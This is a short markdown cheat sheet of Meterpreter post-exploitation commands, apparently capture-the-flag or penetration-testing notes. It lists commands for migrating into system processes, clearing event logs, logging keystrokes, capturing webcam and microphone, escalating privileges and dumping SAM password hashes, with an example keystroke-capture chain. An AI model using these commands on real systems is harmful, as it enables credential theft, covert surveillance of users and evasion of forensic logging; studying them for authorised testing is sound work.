# Meterpreter
 `getpid` -> `ps`
`help` - different results based on OS, components, and connections

#### Core commands
`background`, `exit`
`guid` - get the session Globally Unique Identifier
`info MODULE` - show info on a Post module
`irb` - interactive Ruby shell
`load EXT` - load meterpreter extension
`run EXPLOIT_PATH/MODULE` - execute script or post module
`migrate` - migrates meterpreter to another process 
> (services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe)

#### File system:
`search -f  REGEX_PATTERN`
`cd, ls, pwd, edit, cat, rm, search, upload, download`

#### Networking:
`arp` - displays host ARP cache
`ifconfig`
`netstat` - display network connections
`portfwd` - forwards a local port to a remote service
`route` - view and modify routing table

#### System:
`clearev` - clear event logs
`getuid` - shows the user that meterpreter is running as
`kill`, `pkill` - by number, by name
`shell` - drops into system command shell
`execute, getpid, sysinfo, ps, reboot, shutdown`

#### Other:
i`dletime` - number of seconds the remote user has been idle
`keyscan_dump` - dump keystroke buffer
`keyscan_start`, keyscan_stop
`screenshare, screenshot`
`record_mic, webcam_list, webcam_snap`
`webcam_chat` - starts video chat
`webcam_stream` - plays video stream from specified webcam
`getsystem` - attempts elevating privileges to local system
`hashdump` - dump content of the SAM (Security Account Manager) database stored in NTLM (New Tech LAN Manager) format

#### Example Post-Exploitation commands:
`help`
`meterpreter > getuid` -> `NT AUTHORITY\SYSTEM` = admin on windows
`ps` -> `migrate XXX` -> `keyscan_start` -> `keyscan_stop` -> `keyscan_dump` (migrate to word.exe to catch keystrokes)
`hashdump`
`search -f *flag*.txt`
`shell` -> CTRL-Z to return to meterpreter